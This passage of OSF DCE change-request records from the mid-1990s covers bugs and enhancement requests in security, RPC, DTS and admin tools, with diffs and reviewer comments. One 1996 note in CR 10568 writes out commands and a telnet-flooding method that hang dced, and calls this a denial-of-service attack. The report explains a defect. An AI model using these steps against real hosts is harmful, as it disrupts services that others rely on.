example, (Transarc's) defect AFS-5412.
Evidence of this problem was being seen in TGT_REQ and other messages
displayed by SECD -- they were getting garbled. DFS was also getting
cores dumps out of it.
Transarc's internal solution to this was to produce two additional
routines, the first of which allocates a buffer and returns it to be
freed by the caller at its leisure, and another that accepts a buffer
and buffer length from above for use in returning the text. However,
this approach does require editys to be made at all use sites of
error_message(), and unless these fixes become part of the accepted base
code, we'll have to periodically search for new instances of its use
(after each OSF code drop) and fix them; further, other vendors will be
equally inconvenienced.

[8/17/94 public]

How about changing the prototype of error_message from :

  const char * error_message (int code)

to:

  char * error_message (int code, char **msg)

The caller would be responsible for freeing the contents of msg.
Although I am wondering how important the "const" is.


[31-Aug-94 public]
priority lowered to indicate that this will not be fixed in the 1.1 mainline



CR Number                     : 10799
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : krb5
Short Description             : Symbols undefined when using ASN1_DEBUG
Reported Date                 : 5/27/94
Found in Baseline             : 1.0.3
Found Date                    : 5/27/94
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 
Fixed In Baseline             : 
Affected File(s)              : krb5/lib/mvr/encode.c|decode.c
Sensitivity                   : public

[5/27/94 public]

     If you build security with the flag ASN1_DEBUG, the symbols MVR_UNLOCK,
     MVR_LOCK, and MVR_LEAKCHECK are not defined.
     In order to compile DCE with ASN1_DEBUG, I added the following lines
     to decode.c and encode.c.


 #ifdef ASN1_DEBUG
 #   define debug_printf(ARG_LIST) printf ARG_LIST
>#   define MVR_LOCK()
>#   define MVR_UNLOCK()
>#   define MVR_LEAKCHECK(x)
 #else
 #   define debug_printf(ARG_LIST)
 #   define MVR_LOCK()
 #   define MVR_UNLOCK()
 #   define MVR_LEAKCHECK(x)
 #endif

[05/27/94 public]
Isn't it better to move those three #defines outside of the #ifdef
altogether?

[5/27/94 public]
Yes, that would seem to be the obvious fix, rather than have the redundant
defines.  Somebody will get to this at some point, but I've downgraded it from
C2 to E4 since it only affects you if you're building with ASN1 debugging
turned on, which is not the normal mode of operation...

[9/6/94 public]
Currently not supporting the building of DCE with ASN1_DEBUG defined should
not be construed as a bug, but just a limitation...  I've changed this to an
enhancement request that we support building of DCE with ASN1_DEBUG defined.



CR Number                     : 10747
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : other
Component Name                : sec
Subcomponent Name             : krb5/lib/os/localaddr.c
Short Description             : extraction of network
interfaces won't scale
Reported Date                 : 5/24/94
Found in Baseline             : 1.0.3
Found Date                    : 5/24/94
Severity                      : C
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[5/24/94 public]

Customer reported:
"In the krb5_os_localaddr() routine, (krb5/lib/os/localaddr.c),
 the logic which extracts available network interfaces is hard-coded
 to accommodate 32 such.  This is too small for our needs.  In addition,
 memory is allocated on the stack rather than malloc'd, and we suggest
 modifying this as well.

 This is identical to the problem seen in the rpc runtime
 enumerate_interfaces() routine. In fact, one wonders whether
 or not this duplication is really necessary...
"

Both 1.0.3 and 1.1 code use buf[1024] for extraction in both rpc and krb5
code.

Suggested fix (for krb5 part):

     *** /tmp/ci.24291..localaddr.c.24323.1     Wed May 18 15:12:08 1994
     --- /tmp/localaddr.c.24323.2       Wed May 18 15:12:08 1994
     ***************
     *** 18,27 ****
     --- 18,31 ----
        * src directory for the full copyright text.
        */
       /*
        * HISTORY
        * $Log:	c010747,v $
# Revision 1.6  96/06/25  10:42:44  root
# changed fields: Status  
# 
# Revision 1.5  94/08/24  13:56:43  root
# changed fields: Defect or Enhancement?  Priority  Status  Fix By Baseline  
# 
# Revision 1.4  94/08/24  13:37:59  root
# changed fields:  new/changed/deleted note(s) [max@osf.org 8/24/94 ]
# 
# Revision 1.3  94/08/11  15:49:12  root
# changed fields: Responsible Engr.  Resp. Engrs Company  
# 
# Revision 1.2  94/06/06  14:43:30  root
# changed fields: Responsible Engr.  Resp. Engrs Company  
# 
# Revision 1.1  94/05/24  11:39:09  root
# new CR
# 
     +  * Revision 7.3  1994/05/18  19:12:05  rusman
     +  * Reason:  OSDqa08190 extraction of network interfaces won't scale
     +  * make krb5_os_localaddr() scale up a bit more
     +  *
        * Revision 7.2  1993/11/16  19:34:13  rusman
        * rollup to 1.0.3-
        *
        * Revision 1.1.7.2  1993/06/24  20:19:57  hinman
        *       [hinman] - Save merged-in SNI version (these files have been freed of nasty code)
     ***************
     *** 152,177 ****
           krb5_address ***addr;
       {
           struct ifreq *ifr;
           struct ifconf ifc;
           int s, code, n, i;
           char buf[1024];
           krb5_address *addr_temp [ 1024/sizeof(struct ifreq) ];
           int n_found;
           int mem_err = 0;
     !
           ifc.ifc_len = sizeof(buf);
           ifc.ifc_buf = buf;

           s = socket (USE_AF, USE_TYPE, USE_PROTO);
     !     if (s < 0)
        return errno;

           code = ioctl (s, SIOCGIFCONF, (char *)&ifc);
           if (code < 0) {
        int retval = errno;
        close(s);
        return retval;
           }
           n = ifc.ifc_len / sizeof (struct ifreq);

           for (n_found=0, i=0; i<n && ! mem_err; i++) {
     --- 156,200 ----
           krb5_address ***addr;
       {
           struct ifreq *ifr;
           struct ifconf ifc;
           int s, code, n, i;
     + #if defined(hitm)
     + #define BUFSZ 4096
     +     uchar *buf;
     +     krb5_address *addr_temp [ BUFSZ/sizeof(struct ifreq) ];
     + #else
           char buf[1024];
           krb5_address *addr_temp [ 1024/sizeof(struct ifreq) ];
     + #endif
           int n_found;
           int mem_err = 0;
     ! #if defined(hitm)
     !     buf = (uchar *)malloc(BUFSZ*sizeof(uchar));
     !     if (!buf) return(errno);
     !     ifc.ifc_len = BUFSZ*sizeof(uchar);
     !     ifc.ifc_buf = (caddr_t) buf;
     ! #else
           ifc.ifc_len = sizeof(buf);
           ifc.ifc_buf = buf;
     + #endif

           s = socket (USE_AF, USE_TYPE, USE_PROTO);
     ! #if defined(hitm)
     !     if (s < 0) { free(buf); return errno; }
     ! #else
     !     if (s < 0)
        return errno;
     + #endif

           code = ioctl (s, SIOCGIFCONF, (char *)&ifc);
           if (code < 0) {
        int retval = errno;
        close(s);
     + #if defined(hitm)
     +  free(buf);
     + #endif
        return retval;
           }
           n = ifc.ifc_len / sizeof (struct ifreq);

           for (n_found=0, i=0; i<n && ! mem_err; i++) {
     ***************
     *** 268,283 ****
     --- 291,312 ----
           if (mem_err) {
        for (i=0; i<n_found; i++) {
            free((char *)addr_temp[i]);
            addr_temp[i] = 0;
        }
     + #if defined(hitm)
     +  free(buf);
     + #endif
        return ENOMEM;
           }

           for (i=0; i<n_found; i++) {
        (*addr)[i] = addr_temp[i];
           }
           (*addr)[n_found] = 0;
     + #if defined(hitm)
     +  free(buf);
     + #endif
           return 0;
       }

       #endif /* SNI_SVR4_TAINTED */

[8/24/94]

This should be deferred past 1.1 for two reasons.
Support for 32 network interfaces is not pressing enough,
right now.
The rpc component has exactly the same issue and it is
not dealt with in the 1.1 timeframe.

I'll make it an enhancement and defer it (to 1.2 ?) tomorrow
if nobody objects.



CR Number                     : 10746
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : other
Component Name                : rpc
Subcomponent Name             : uuid_from_string
Short Description             : uuid_from_string fails to reject
a uuid string with a non-hexadecimal final character
Reported Date                 : 5/24/94
Found in Baseline             : 1.1
Found Date                    : 5/24/94
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : .../src/rpc/runtime/uuid.c
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[5/24/94 public]

 The routine uuid_from_string() can accept an invalid string as a valid
uuid. That is, a string the last character of which is not hexadecimal.
This is because of the peculiar behaviour of sscanf (and the DCE routine
uuid__sscanf) which stop parsing a "%x" format when they reach a
non-hexadecimal character. If the first character of the last uuid field
(which is two characters) is hexadecimal, and the second is not, scanf will
react just as if both characters were hexadecimal.

[8/15/94 public]
So I don't see anyway we can fix this without going through a great
deal of trouble.  Perhaps this is a bug in scanf().
Not going to get fixed.
Canceled.

[8/15/94 public]
Doesn't mean it still isn't a bug though.  Changed to defer, perhaps in the
future someone will have time to fix this.



CR Number                     : 10723
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dts
Subcomponent Name             : dts
Short Description             : Perf enh. use of threads
Reported Date                 : 5/20/94
Found in Baseline             : 1.0.3
Found Date                    : 5/20/94
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[01/01/93 public]
[5/20/94 public  sikkema]
[public sikkema]
(a). DTSD creates a GetTimeFromProvider thread on each synchronization.
Once synchronization is done this threads is destroyed and respective
data structures deleted.  This creation and destruction of this
threads happen on each synchronization. Therefore, there is lot of
thread activity going on this component.

Solution: DTS should look at keeping this threads around so that this is
========  used on each synchronization.  This will cut down the overhead
of thread creation and destruction during each synchronization.  This
can be achieved by suspending a thread on a condition variable, and
during synchronization this condition variable is signalled to wake
b).DTS should look at why there needs to be a thread(GetTimeFromServerRPC)
to request time from servers via RPC.



CR Number                     : 10719
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : security/utils/
Short Description             : Problems compiling with -D DEBUG
Reported Date                 : 5/20/94
Found in Baseline             : 1.0.3
Found Date                    : 5/20/94
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[5/20/94 public]

     There were several problems encounterd when attempting to compile the
     file with DEBUG.  Problem 1 involves a missing comma in the printf
     argument list, and also necessitated changing the Endian of the
     arguments (code enclosed for both).  Problem 2 involved a comparison
     between an int and an unisgned int.

Problem 1  (approximately line 1219)
====================================

[1.1 code, this is in seca_dg.c]

NOTE:  This fix only works if the machine in question is Big Endian.

#ifdef DEBUG
< #ifdef _FTX
< #define FTX_EXT32(p) ( (unsigned32)(*p)<<24 | (unsigned32)(*(p+1))<<16 | (unsigned32)(*(p+2))<<8 | (unsigned32)(*(p+3)) )
<       {
<       idl_byte *bp; unsigned32 i[2],j[2];
<
<       bp=challenge->bits;
<       i[0]= FTX_EXT32(bp); bp+=4;
<       i[1]= FTX_EXT32(bp);
<       bp=nonce2.bits;
<       j[0]= FTX_EXT32(bp); bp+=4;
<       j[1]= FTX_EXT32(bp);
<
<       printf("given nonce: %08x%08x; packet nonce: %08x%08x\n",
<              i[0], i[1], j[0], j[1]);
<       }
<#else
        printf("given nonce: %08x%08x; packet nonce: %08x%08x\n",
<           ((unsigned32 *)(challenge))[0], ((unsigned32 *)(challenge))[1]
---
>           ((unsigned32 *)(challenge))[0], ((unsigned32 *)(challenge))[1],

<#endif
#endif


Problem 2)  (approximately line 1645)
=====================================

	In sec_id_pac_print(), for statement:

    for (i=0; i<pac->num_groups; i++) {

Here i is of type int, but pac->num_groups is unsigned. To remove the 
compiler warning, declare i as unsigend too.

[10/3/94 public]
The above is "extra" unsupported debugging info that just isn't currently
usable.  Since we don't support building the DCE1.1 security comp with -DDEBUG
it's not a bug that this extra debugging info isn't quite right.  I've made
this an enhancement request.



CR Number                     : 10718
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : krb5/lib/crypto/common/string2key.c
Short Description             : The symbol mit_des_debug is undefined, when DEBUG enabled
Reported Date                 : 5/20/94
Found in Baseline             : 1.0.3
Found Date                    : 5/20/94
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[5/20/94 public]

     There is a misdeclared variable at the top of the file, des_debug,
     which should be mit_des_debug to compile the file with DEBUG.

     #ifdef DEBUG
     #include <stdio.h>

     80c80
     < extern int des_debug;
     ---
     > extern int mit_des_debug;

     #endif

1.1 code has the same problem.

[10/3/94 public]
We don't claim to support the building of Kerberos w/in security, with -DDEBUG
so this is not a defect in the product.  I've made this an enhancement request.



CR Number                     : 10660
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dts
Subcomponent Name             : 
Short Description             : header file org. needs work
Reported Date                 : 5/16/94
Found in Baseline             : 1.1
Found Date                    : 5/16/94
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[5/16/94 public]
The dts header file organization has some problems when it comes
to exporting information to client control programs, namely it
doesn't.

time/common/dtssdef.h and time/common/dtss_mgmt_support.h redefine
many things that are in the idl generated dtss_ctrl.h . What needs 
to happen is that all information duplicated in dtss_ctrl.h should
be removed from the other header files and have them include it
instead. 

All #defines needed for control client operation (like K_*) should be
moved to a common file or possibly included into dtss_ctrl.idl. This
will allow a client (like dcecp) to include dtss_ctrl.h and possibly
one other header file and have everything it needs.

With the dts control API now able to manage remote dts daemons, it 
should also be considered if this API should be made public.

[7/16/94 public]

Changing this from a defect to an enhancement. The current
implementation works for both dts and dcecp.



CR Number                     : 10620
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : 
Short Description             : intercell initrep and delrep fail
Reported Date                 : 5/12/94
Found in Baseline             : 1.0.3
Found Date                    : 5/12/94
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[5/12/94 public]

Intercell sec_admin initrep and delrep commands fail.
_____________________________________________________
Intercell is configured.  I've dce_logged into the foreign cell as
/.../foreign_cell/cell_admin.  I site to the slave server.

sec_admin> delrep fails to delete a slave in the foreign cell when the default
replica is the slave.

ALSO
sec_admin> initrep fails in the foreign cell when the default replica is the
slave.

When the default replica is the master, I am able to delete the replica
in the foreign cell or issue an initrep successfully. But when the
default replica is the slave replica then these commands do not work.
The following message is displayed on the master replica in the foreign cell :

sec_admin> (RPC_CN_AUTH_VFY_CLIENT_REQ) on server failed status = 14129090


It appears that something is corrupting the binding handle sec_admin
is supposed to bind to. Both initrep and delrep have the
set_default_to_master call in common although this call appears to
succeed. See OT#10588 which is also an intercell problem that may be
related to this problem.

Below is sample output from the sec_admin> delrep command:

sec_admin> site /.../texas.austin.ibm.com/subsys/dce/sec/repl1
Default replica:  /.../texas.austin.ibm.com/subsys/dce/sec/repl1
Default cell:     /.../texas.austin.ibm.com
sec_admin> delrep subsys/dce/sec/repl1

WARNING: Command requires default replica to be the master
/.../texas.austin.ibm.com/subsys/dce/sec/repl1 is not a master replica
Attempting to reset the default replica to the master now
Default replica:  /.../texas.austin.ibm.com/subsys/dce/sec/master
Default cell:     /.../texas.austin.ibm.com
Do you wish to continue (y[es]) or abort this operation (n[o])? y
Delete replica operation failed - connection closed (dce / rpc)
sec_admin>



Below is sample output from the sec_admin> initrep command:

sec_admin> site /.../texas.austin.ibm.com/subsys/dce/sec/repl1
Default replica:  /.../texas.austin.ibm.com/subsys/dce/sec/repl1
Default cell:     /.../texas.austin.ibm.com
sec_admin> initrep subsys/dce/sec/repl1

WARNING: Command requires default replica to be the master
/.../texas.austin.ibm.com/subsys/dce/sec/repl1 is not a master replica
Attempting to reset the default replica to the master now
Default replica:  /.../texas.austin.ibm.com/subsys/dce/sec/master
Default cell:     /.../texas.austin.ibm.com
Do you wish to continue (y[es]) or abort this operation (n[o])? y
Initialize replica operation failed - connection closed (dce / rpc)
sec_admin>

[8/18/94 public]
Can someone check to see if the equivalent commands work in dcecp?
If so, then this can become an E4 against "old" admin tools.

[8/18/94 public]

After a conversation with Howard, we believe that dcecp will not have the
same problem, so this is being downgraded.



CR Number                     : 10614
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : sec_admin
Short Description             : sec_admin does not display
time in a DTS-style or locale dependent format.
Reported Date                 : 5/11/94
Found in Baseline             : 1.1
Found Date                    : 5/11/94
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[5/11/94 public]

The control program sec_admin displays the time as part of
the output of several commands. The time is not displayed 
in DTS format or locale format. According to RFC 23, all 
non-DTS style time should be converted to internationalized 
format.  

Example: Using the japanese.euc locale, here is the output
of sec_admin.

# echo $LANG
japanese.euc
#
#sec_admin> monitor
Default replica:  /.../b_cell.qadce.osf.org/subsys/dce/sec/master
Default cell:     /.../b_cell.qadce.osf.org

subsys/dce/sec/master (master)
          State:                   in service - master
          Last update received at: Tue May 10 10:18:17 1994
          Last update's seqno:     0.211
sec_admin> info 

Default replica:  /.../b_cell.qadce.osf.org/subsys/dce/sec/master
Default cell:     /.../b_cell.qadce.osf.org
          State:                   in service - master
          Last update received at: Tue May 10 10:18:17 1994
          Last update's seqno:     0.211
sec_admin>

[7/27/94 public]
This CR either does not affect dcecp or has a related CR open.
It really belongs to sec_admin and should not be assigned to dcecp.

[8/1/94 public]
All control program bugs are being changed to E4 due to the existance
of dcecp.

[12/21/95 public]
sec_admin was never designed to do this and we have no intention of doing
this at this time.  It remains in the build tree solely for backwards
compatibility with existing customer scripts...   Any new functionality
should be added to dcecp.  I've changed this to an enhancement request
in case anybody else wants to do this work themselves (only if done with
a new cmd line argument, so that the default behavior remains backwards
compatible).



CR Number                     : 10597
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dts
Subcomponent Name             : dtsd
Short Description             : dtsd fails to initiallize if the security server is not available
Reported Date                 : 5/10/94
Found in Baseline             : 1.0.3
Found Date                    : 5/10/94
Severity                      : C
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : dtss_service_main.c
Sensitivity                   : public

[5/10/94 public]


From: pare@apollo.hp.com
Subject: DTSD re-try fix

I fixed a dtsd initiallization problem -- you may be interested
in implementing the change. Let me know your thoughts.



PROBLEM
dtsd fails to initiallize if the security server is not available --
dtsd exits with the following error message:

   Error in initialization: No currently established network identity for 
   which context exists (dce / sec)

Since it is conceivable that client nodes can re-boot before server nodes
(as in a power fail/restore situation) it make sense to re-try during
dtsd initiallization.




SOLUTION
Add re-try loop to InitializeService () in dtss_service_main.c, 
re-try every minute for 5 minutes.



DIFFS

10a11,13
>  * Revision /main/HPDCE01/pare_rodan/1  1994/05/03  18:06 UTC  pare
>  * 	Add wait loop for DCE services
>  * 
253a257,259
> #ifdef __hpux
> #include <syslog.h>
> #endif
749a756,758
>     int count;
> #define FIVE 5
> #define ONE_MINUTE 60
778a788,793
> #ifdef __hpux
> openlog("dtsd", LOG_PID, LOG_LOCAL0);
> syslog(LOG_INFO, "main: start");
> if (debug_mode)
>     printf("dtsd: main: start \n");
> #endif
780d794
< 
---
> 
> #ifdef __hpux
> /* Add security re-try loop -- try every minute for five minutes
>  * during initialization. This is necessary for the case where the
>  * DCE client machine comes up before the server.
> */
>     count = 0;
>     do
>     {
>         get_security_config_info (&rpcBuf.host_principal,
>                            &rpcBuf.my_cell,
>	        	     &rpcStatus);
>         if (rpcStatus != error_status_ok) {
>           ++count;
>           dce_error_inq_text(rpcStatus, tempString, &locstat);
> 	    syslog(LOG_WARNING, tempString);
> 	    fprintf(stderr, "\tError in initialization: %s \n",tempString);
> 	    fprintf(stderr, "\tWaiting one minute for DCE security services -- retries remaining: %d\n", FIVE-count);
> 	    sleep(ONE_MINUTE);
>         }
> 	  else {
> 	    syslog(LOG_INFO, "Security initialization successful.");
> 	    fprintf(stderr, "\tSecurity initialization successful.\n");
> 	    break;
>         }
>      }
>      while( count < FIVE);
> #else
> 	get_security_config_info (&rpcBuf.host_principal,
> 				      &rpcBuf.my_cell, &rpcStatus);
> #endif /* __hpux */
> 
833c876
< 	fprintf(stderr, "Error in initialization: %s \n",tempString);
---
> 	fprintf(stderr, "\tError in initialization: %s \n",tempString); 
1074a1118,1122
> 
> #ifdef __hpux
>     syslog(LOG_INFO, "terminate");
>     closelog();
> #endif




Regards,
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
Larry Pare                    Chelmsford Systems Software Lab
(508) 436-4378                Hewlett-Packard Corporation
pare@ch.hp.com                Chelmsford, MA 01824
                              FAX 508-436-5119
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

----- End of forwarded message -----

[8/31/94 public]

There are a couple of problems and issues with the above solution. 

1. get_security_config_info() does a couple of other things beside 
calling the DCE security service; one of them is retrieving the cell 
name. If this fails, it doesn't make sense to keep trying for 5
minutes: the response will always be the same. If this looping
behavior is desired, then it should be implemented inside of the 
the get_security_config_info() call. 

2. That having been said, it's not clear to me that this is in fact
the desired behavior. The question to ask, is: do I want my {rc.dce
script, config script} to wait for 5 minutes before telling me that 
the security service isn't available, or do I want to know that
immediately? I don't know what the correct solution is, and I believe
that reasoned arguments can be made for both cases.

Marking this as an enhancement: DCE 1.2 can sort this out.



CR Number                     : 10588
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : 
Short Description             : sec_admin inter-cell functionality
Reported Date                 : 5/9/94
Found in Baseline             : 1.0.3
Found Date                    : 5/9/94
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[5/9/94 public]

There are numerous problems when using sec_admin to do intercell
manipulations.

I first log into the foreign cell.  I invoke sec_admin and then
site to the foreign cell.

A sec_admin> lrep -all command does not return state information.  I
believe this is due to the code having "/.:" hard-coded as a parameter -
it returns a:

subsys/dce/sec/master (master)
          Instance id: 006f7c00-9533-1d4d-9a5a-10005aa8bb82
          Addresses:               ncacn_ip_tcp:129.35.68.58[]
                                   ncadg_ip_udp:129.35.68.58[]
                    State:         unavailable - connection closed (dce / rpc)

The state is unavailable, I believe, due to the rgyh being used with a
local cell cellname and a foreign cell site name.  Any attempt to pass as input
the foreign cell name (either hard-coded or received as output from
sec_rgy_site_binding_get_info call) causes sec_admin to core dump.


This type of behavior also occurs when doing a sec_admin> state -m
or sec_admin> state -s command.

On the foreign cell the following error message is displayed:

(RPC_CN_AUTH_VFY_CLIENT_REQ) on server failed status = 14129090

The rgy_edit cell command dumps core in 1.1.

[ mob 8/18/94 public ]
Can someone check to see if the equivalent commands in dcecp work?
If so, this can be changed to an E4 against the "old" admin commands.

[8/18/94 public]
After a conversation with Howard, we believe that dcecp will not have the
same problem, so this is being downgraded.

[3/11/96 public]
sec_admin was never meant to administer foreign cells, so this is really
an enhancement request.  Admins should really be using dcecp now, since
sec_admin is an obsolete tool.  Moved to the enhancement category.



CR Number                     : 10571
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 11513,11582
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : utils
Subcomponent Name             : svc
Short Description             : dce_svc_debug_set_levels should detect bad where strings
Reported Date                 : 5/6/94
Found in Baseline             : 1.1
Found Date                    : 5/6/94
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[5/6/94 public]

In the case where dce_svc_debug_set_levels does "lazy"
evaluation of the "where" string -- i.e., the component
name isn't yet mapped to a handle, so the string is just
stored until it can be evaluated later -- no error checking
is done on the string.  This could result, for example, in
a bogus "where" string going undetected for days or weeks
while an application runs, until one day an error occurs
and debug output should be printed, but isn't because the
evaluation of the "where" string fails.

It may not be possible to detect bad component or sub-component
names before everything is registered, but checking the general
form of the "where" string, at least, is possible and useful.

[08/27/94 public]
This defect is the catch-call for all requests for SVC to validate its
routing when changed, not when used.  See the Inter-dependent CRs for
various bits and pieces of the puzzle that people want addressed.

[1/3/94 public]
Won't be in 1.1.



CR Number                     : 10568
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 8224
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : runtime
Short Description             : CN needs watchdog timeout on association opens
Reported Date                 : 5/6/94
Found in Baseline             : 1.0.3
Found Date                    : 5/6/94
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : cnassoc.c cnrcvr.c
Sensitivity                   : public

[5/6/94 public]
Too many times we've seen the case where a CN RPC call hangs up a client
because the server was hung up and never responded to the initial negotiation
packet that the client sent.  We've also seen hangs where the client mistakenly
connected to a non-DCE socket.

The CN watchdog timer event, which already looks for associations to reap, 
should also keep watch over attempts to set up a new association, and abort
it if nothing has happened for some long period, like a minute.

[05/06/94 public]
It may be dangerous to timeout a connection like this, on slow networks
or machines.  I have no idea how you manage to get a client to
connect to a non-DCE socket, I know there is/was a defect on this in
the database.

[5/6/94 public]
TCP already does the 75-second timeout on getting a connection.  The problem
is if the endpoint map has an old entry for the server you're looking for, and
some other non-DCE program is listening on that socket now, then the client
will be able to get connected, will send the opening salvo of syntax 
negotiation, but if the non-DCE server is doing a read looking for a linefeed,
it's going to silently absorb the client's request and keep waiting for that
linefeed (since the syntax negotiation doesn't contain 0x0a).  And the client
is going to wait for the syntax negotiation response.

Forever.

[8/19/94 public]
This seems like a reasonable enhancement, 
but of course it is out of the 1.1 scope.

I belive that with dced in 1.1, the endpoint management should be more robust. 
Work has been done on the core services so they remove their endpoints
from the ep map on shutdown.  This should help with stale endpoint problems.
And of course, any well behaved application should also remove its
endpoints when it shuts down.

Since problems described above generally happen when things go wrong
(servers hanging, servers no unregistering endpoints),
perhaps this can be done if/when there is a DCE robustness project.

[2/2/96 public]

This bug has a quite interesting impact on dced. Consider a server which
does the following typical initializaiton:

  rpc_server_use_all_protseqs(...);
  rpc_server_inq_bindings(...);
  rpc_server_register_if(...);
  rpc_ep_register(...);

then never call rpc_server_listen(). (It could be busy, doing something
else.) Since the TCP/IP listening port is open, when ep_ping1 thread in
dced pings it the call hangs. This means no more cleanup of stale
endpoints. Also, because this blocking rpc is creating a new association
group, it holds grp_new_mutex and prevents other threads opening a new
association. If maintain_machine_context and/or keymgmt_handler threads try
to talk to secd over CN, it gets blocked and the host's TGT will expire.
You can try: (The port 23 is the telnet port.)

  dcecp -c account modify hosts/foo/self -maxtktlife +0-00:10:00
  dcecp -c endpoint create -i `uuidgen`,0.0 -b '{ncacn_ip_tcp:[23]}'

Another hangup can be caused by a non rpc client connecting to a server.
Run a lot of "telnet foo 135". At some point, dced's open file descriptor
table becomes full and can't make/accept any CN rpc. (DG still works,
though.) And of course, if it can't open a file, then it can't update a
credential file. A simple denial of service attack.

By the way, rpc__cn_assoc_timer_reclaim() can't be used to watch these
events because in both cases a new association hasn't been added to a
association group.



CR Number                     : 10564
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cds
Subcomponent Name             : cdscp
Short Description             : cdscp show dir /... hangs
Reported Date                 : 5/6/94
Found in Baseline             : 1.1
Found Date                    : 5/6/94
Severity                      : C
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[5/6/94 public]

Well, it may be meaningless to do, but cdscp show dir /... shouldn't
hang forever.  (This was executed in a cell without GDS running).



CR Number                     : 10546
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dcecp
Subcomponent Name             : acl
Short Description             : allow uuid's in acl entry keys
Reported Date                 : 5/5/94
Found in Baseline             : 1.1b8, 1.2
Found Date                    : 5/5/94
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : nextrel
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[5/5/94 public]
There is a CR open against acl_edit about this, this one is for dcecp.

If a principal is deleted from the registry, you can't remove any ACL
entries that refer to that principal.  E.g.

   dcecp> princ del melman
